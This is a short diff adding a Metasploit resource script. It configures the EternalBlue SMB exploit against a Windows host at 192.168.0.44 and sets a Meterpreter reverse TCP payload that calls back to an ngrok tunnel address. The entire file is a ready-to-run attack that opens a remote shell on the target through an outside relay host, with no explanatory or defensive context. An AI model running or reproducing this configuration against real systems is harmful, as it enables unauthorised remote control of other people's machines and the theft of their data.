@@ -1,0 +1,13 @@
+use exploit/windows/smb/ms17_010_eternalblue
+
+set payload  windows/meterpreter/reverse_tcp
+
+set LHOST 0.tcp.ngrok.io
+
+set LPORT 11684
+
+set RHOST  192.168.0.44
+
+
+
+
